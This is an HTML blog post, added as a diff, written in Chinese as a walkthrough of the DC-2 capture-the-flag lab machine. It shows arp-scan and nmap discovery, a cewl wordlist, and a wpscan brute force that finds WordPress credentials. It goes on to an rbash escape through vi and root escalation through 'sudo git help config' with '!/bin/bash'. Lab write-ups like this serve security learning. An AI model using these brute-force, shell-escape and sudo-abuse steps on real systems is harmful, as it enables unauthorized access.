@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="17year" />
+  <meta name="author" content="17year" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      DC1靶机记录 
+      
+      
+      |
+    
+     17year&#39;s Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">17year</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">AboutMe</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">DC1靶机记录</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="更新时间"></i>
+          2022-02-14 13:42:16
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="标签"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/" title="靶机记录">
+                    <b>#</b> 靶机记录
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="DC2-靶机记录"><a href="#DC2-靶机记录" class="headerlink" title="DC2 靶机记录"></a>DC2 靶机记录</h1><h3 id="主机发现-内网其他主机省略"><a href="#主机发现-内网其他主机省略" class="headerlink" title="主机发现 内网其他主机省略"></a>主机发现 内网其他主机省略</h3><p>使用arp-scan 扫描发现主机指定网卡en0</p>
+<p><code>sudo arp-scan --interface=en0 -l</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.27.xxx	00:0c:29:55:55:aa	VMware, Inc.</span><br></pre></td></tr></table></figure>
+
+<h3 id="nmap查看相关信息"><a href="#nmap查看相关信息" class="headerlink" title="nmap查看相关信息"></a>nmap查看相关信息</h3><p><code>sudo nmap -p- 172.16.27.xxx -sV -O -vv</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE REASON         VERSION</span><br><span class="line">80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))</span><br><span class="line">7744/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line"></span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br></pre></td></tr></table></figure>
+
+<h3 id="访问80端口"><a href="#访问80端口" class="headerlink" title="访问80端口"></a>访问80端口</h3><p>不能访问自动跳转<a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2</a> 修改hosts文件绑定ip与域名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1	localhost</span><br><span class="line">127.0.1.1	kali</span><br><span class="line">172.16.27.xxx dc-2  #添加该行</span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br></pre></td></tr></table></figure>
+<p>发现该该网站使用<code>WordPress CMS Version:4.7.10</code></p>
+<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>访问web页面发现flag目录发现flag1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Flag 1:</span><br><span class="line">Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</span><br><span class="line">More passwords is always better, but sometimes you just can’t win them all.</span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line">If you can’t find it, log in as another.</span><br></pre></td></tr></table></figure>
+<p>依据flag1提示使用cewl工具,尝试寻找隐藏在页面中的密码</p>
+<p><code>cewl -w dc2_pwd.txt http://dc-2</code></p>
+<p><strong>dc2_pwd.txt</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line">sit</span><br><span class="line">amet</span><br><span class="line">nec</span><br><span class="line">quis</span><br><span class="line">vel</span><br><span class="line">orci</span><br><span class="line">site</span><br><span class="line">non</span><br><span class="line">sed</span><br><span class="line">vitae</span><br><span class="line">luctus</span><br><span class="line">sem</span><br><span class="line">Sed</span><br><span class="line">leo</span><br><span class="line">ante</span><br><span class="line">content</span><br><span class="line">nisi</span><br><span class="line">Donec</span><br><span class="line">turpis</span><br><span class="line">Aenean</span><br><span class="line">wrap</span><br><span class="line">tincidunt</span><br><span class="line">finibus</span><br><span class="line">dictum</span><br><span class="line">egestas</span><br><span class="line">volutpat</span><br><span class="line">justo</span><br><span class="line">odio</span><br><span class="line">eget</span><br><span class="line">Vestibulum</span><br><span class="line">ipsum</span><br><span class="line">neque</span><br><span class="line">erat</span><br><span class="line">vestibulum</span><br><span class="line">interdum</span><br><span class="line">quam</span><br><span class="line">sodales</span><br><span class="line">nulla</span><br><span class="line">suscipit</span><br><span class="line">arcu</span><br><span class="line">urna</span><br><span class="line">dui</span><br><span class="line">faucibus</span><br><span class="line">sapien</span><br><span class="line">blandit</span><br><span class="line">nibh</span><br><span class="line">tellus</span><br><span class="line">auctor</span><br><span class="line">nisl</span><br><span class="line">sagittis</span><br><span class="line">Suspendisse</span><br><span class="line">laoreet</span><br><span class="line">fermentum</span><br><span class="line">Our</span><br><span class="line">metus</span><br><span class="line">eros</span><br><span class="line">cursus</span><br><span class="line">dignissim</span><br><span class="line">Pellentesque</span><br><span class="line">tortor</span><br><span class="line">lacus</span><br><span class="line">consectetur</span><br><span class="line">convallis</span><br><span class="line">velit</span><br><span class="line">malesuada</span><br><span class="line">Proin</span><br><span class="line">rhoncus</span><br><span class="line">mauris</span><br><span class="line">placerat</span><br><span class="line">commodo</span><br><span class="line">enim</span><br><span class="line">dolor</span><br><span class="line">augue</span><br><span class="line">purus</span><br><span class="line">maximus</span><br><span class="line">posuere</span><br><span class="line">iaculis</span><br><span class="line">molestie</span><br><span class="line">WordPress</span><br><span class="line">Integer</span><br><span class="line">felis</span><br><span class="line">lobortis</span><br><span class="line">condimentum</span><br><span class="line">Nullam</span><br><span class="line">risus</span><br><span class="line">nunc</span><br><span class="line">porttitor</span><br><span class="line">lacinia</span><br><span class="line">imperdiet</span><br><span class="line">porta</span><br><span class="line">viverra</span><br><span class="line">Curabitur</span><br><span class="line">hendrerit</span><br><span class="line">dapibus</span><br><span class="line">diam</span><br><span class="line">branding</span><br><span class="line">header</span><br><span class="line">navigation</span><br><span class="line">entry</span><br><span class="line">aliquam</span><br><span class="line">ullamcorper</span><br><span class="line">Nam</span><br><span class="line">varius</span><br><span class="line">feugiat</span><br><span class="line">ultrices</span><br><span class="line">ligula</span><br><span class="line">scelerisque</span><br><span class="line">congue</span><br><span class="line">gravida</span><br><span class="line">Feed</span><br><span class="line">Mauris</span><br><span class="line">vulputate</span><br><span class="line">semper</span><br><span class="line">elit</span><br><span class="line">tristique</span><br><span class="line">Maecenas</span><br><span class="line">lorem</span><br><span class="line">sollicitudin</span><br><span class="line">Cras</span><br><span class="line">bibendum</span><br><span class="line">Praesent</span><br><span class="line">libero</span><br><span class="line">vehicula</span><br><span class="line">euismod</span><br><span class="line">ultricies</span><br><span class="line">ornare</span><br><span class="line">lectus</span><br><span class="line">Flag</span><br><span class="line">rutrum</span><br><span class="line">fringilla</span><br><span class="line">Morbi</span><br><span class="line">Aliquam</span><br><span class="line">Quisque</span><br><span class="line">primis</span><br><span class="line">magna</span><br><span class="line">pulvinar</span><br><span class="line">Phasellus</span><br><span class="line">tempus</span><br><span class="line">eleifend</span><br><span class="line">elementum</span><br><span class="line">another</span><br><span class="line">What</span><br><span class="line">People</span><br><span class="line">Products</span><br><span class="line">est</span><br><span class="line">accumsan</span><br><span class="line">venenatis</span><br><span class="line">Etiam</span><br><span class="line">pharetra</span><br><span class="line">Fusce</span><br><span class="line">efficitur</span><br><span class="line">Just</span><br><span class="line">Welcome</span><br><span class="line">Nunc</span><br><span class="line">massa</span><br><span class="line">pellentesque</span><br><span class="line">Duis</span><br><span class="line">Nulla</span><br><span class="line">cubilia</span><br><span class="line">Curae</span><br><span class="line">Vivamus</span><br><span class="line">fames</span><br><span class="line">facilisis</span><br><span class="line">consequat</span><br><span class="line">Skip</span><br><span class="line">text</span><br><span class="line">custom</span><br><span class="line">Menu</span><br><span class="line">top</span><br><span class="line">masthead</span><br><span class="line">pretium</span><br><span class="line">potenti</span><br><span class="line">post</span><br><span class="line">main</span><br><span class="line">primary</span><br><span class="line">Proudly</span><br><span class="line">powered</span><br><span class="line">info</span><br><span class="line">colophon</span><br><span class="line">contain</span><br><span class="line">page</span><br><span class="line">Comments</span><br><span class="line">RSD</span><br><span class="line">mollis</span><br><span class="line">mattis</span><br><span class="line">habitant</span><br><span class="line">morbi</span><br><span class="line">senectus</span><br><span class="line">netus</span><br><span class="line">aliquet</span><br><span class="line">tempor</span><br><span class="line">you</span><br><span class="line">Interdum</span><br><span class="line">just</span><br><span class="line">can</span><br><span class="line">Scroll</span><br><span class="line">down</span><br><span class="line">Lorem</span><br><span class="line">adipiscing</span><br><span class="line">panel</span><br><span class="line">facilisi</span><br><span class="line">Orci</span><br><span class="line">natoque</span><br><span class="line">penatibus</span><br><span class="line">magnis</span><br><span class="line">dis</span><br><span class="line">parturient</span><br><span class="line">montes</span><br><span class="line">nascetur</span><br><span class="line">ridiculus</span><br><span class="line">mus</span><br><span class="line">Your</span><br><span class="line">usual</span><br><span class="line">wordlists</span><br><span class="line">probably</span><br><span class="line">won</span><br><span class="line">work</span><br><span class="line">instead</span><br><span class="line">maybe</span><br><span class="line">need</span><br><span class="line">cewl</span><br><span class="line">More</span><br><span class="line">passwords</span><br><span class="line">always</span><br><span class="line">better</span><br><span class="line">but</span><br><span class="line">sometimes</span><br><span class="line">win</span><br><span class="line">them</span><br><span class="line">all</span><br><span class="line">Log</span><br><span class="line">one</span><br><span class="line">see</span><br><span class="line">the</span><br><span class="line">next</span><br><span class="line">flag</span><br><span class="line">find</span><br><span class="line">log</span><br></pre></td></tr></table></figure>
+<h3 id="有了密码尝试使用wpscan查找用户名"><a href="#有了密码尝试使用wpscan查找用户名" class="headerlink" title="有了密码尝试使用wpscan查找用户名"></a>有了密码尝试使用wpscan查找用户名</h3><p><code>wpscan --url http://dc-2 --enumerate u</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jerry</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
+<h3 id="尝试爆破密码-方法不唯一-wpscan-burpsuite-hydra"><a href="#尝试爆破密码-方法不唯一-wpscan-burpsuite-hydra" class="headerlink" title="尝试爆破密码(方法不唯一:wpscan/burpsuite/hydra..)"></a>尝试爆破密码(方法不唯一:wpscan/burpsuite/hydra..)</h3><p><code>wpscan --url http://dc-2 --usernames dc2_uname.txt --passwords dc2_pwd.txt </code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: jerry, Password: adipiscing</span><br><span class="line"> | Username: tom, Password: parturient</span><br></pre></td></tr></table></figure>
+<h3 id="寻找flag2"><a href="#寻找flag2" class="headerlink" title="寻找flag2"></a>寻找flag2</h3><p>已知WordPress后台登录地址:<code>http://ip/wp-admin/</code></p>
+<p>使用tom账号登录没有发现flag2<br>使用jerry账号登录后台发现flag2</p>
+<p><code>http://dc-2/wp-admin/post.php?post=21&amp;action=edit</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line">If you can&#x27;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure>
+<p>根据提示说尝试其他方式猜测使用ssh方式登录</p>
+<h3 id="使用tom-amp-jerry账号登录ssh"><a href="#使用tom-amp-jerry账号登录ssh" class="headerlink" title="使用tom&amp;jerry账号登录ssh"></a>使用tom&amp;jerry账号登录ssh</h3><p>直接登录jerry账号发现不能登录<br><br>尝试使用tom账号登陆成功<br><code>ssh tom@dc-2 -p7744</code></p>
+<h3 id="ls发现flag3"><a href="#ls发现flag3" class="headerlink" title="ls发现flag3"></a>ls发现flag3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ ls</span><br><span class="line">flag3.txt  usr</span><br></pre></td></tr></table></figure>
+
+<p>使用cat发现提示报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ cat flag3.txt</span><br><span class="line">-rbash: cat: command not found</span><br></pre></td></tr></table></figure>
+<p>万般搜索绕过-rbash姿势</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi shell</span><br><span class="line">:set shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+<p>绕过了-rbash限制,但仍未解决</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ cat flag3.txt </span><br><span class="line">bash: cat: command not found</span><br></pre></td></tr></table></figure>
+<p>添加环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ export PATH=$PATH:/bin/</span><br><span class="line">tom@DC-2:~$ export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure>
+<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p><code>tom@DC-2:~$ cat flag3.txt </code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure>
+<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>依据flag3的提示尝试切换至jerry用户<br><br><code>su jerry 密码:adipiscing</code> 可以成功登录发现flag4</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jerry@DC-2:/home/tom$ cd ~</span><br><span class="line">jerry@DC-2:~$ ls</span><br><span class="line">flag4.txt</span><br><span class="line">jerry@DC-2:~$ </span><br></pre></td></tr></table></figure>
+<p><code>jerry@DC-2:~$ cat flag4.txt</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Good to see that you&#x27;ve made it this far - but you&#x27;re not home yet. </span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line">No hints here - you&#x27;re on your own now.  :-)</span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure>
+<h3 id="final-flag"><a href="#final-flag" class="headerlink" title="final_flag"></a>final_flag</h3><p>依据flag4提示提权方式可能与git有关</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jerry@DC-2:~$ sudo -l</span><br><span class="line">Matching Defaults entries for jerry on DC-2:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line">User jerry may run the following commands on DC-2:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/git</span><br></pre></td></tr></table></figure>
+<p>尝试提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jerry@DC-2:~$ sudo git help config</span><br><span class="line">在末端输入:`!/bin/bash`</span><br><span class="line">root@DC-2:/home/jerry# </span><br><span class="line">root@DC-2:/home/jerry# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+<p>获得root权限尝试寻找finalflag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@DC-2:/home/jerry# cd ~</span><br><span class="line">root@DC-2:~# ls</span><br><span class="line">final-flag.txt</span><br><span class="line">root@DC-2:~# cat final-flag.txt </span><br><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span><br><span class="line">\ \/  \/ / _ \ | |  / _` |/ _ \| &#x27;_ \ / _ \/  /</span><br><span class="line"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span><br><span class="line">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulatons!!!</span><br><span class="line"></span><br><span class="line">A special thanks to all those who sent me tweets</span><br><span class="line">and provided me with feedback - it&#x27;s all greatly</span><br><span class="line">appreciated.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/02/11/dc1%E9%9D%B6%E6%9C%BA/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="更新时间"></i>
+              2022-02-14 13:42:16
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="标签"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/" title="靶机记录">
+                        <b>#</b> 靶机记录
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
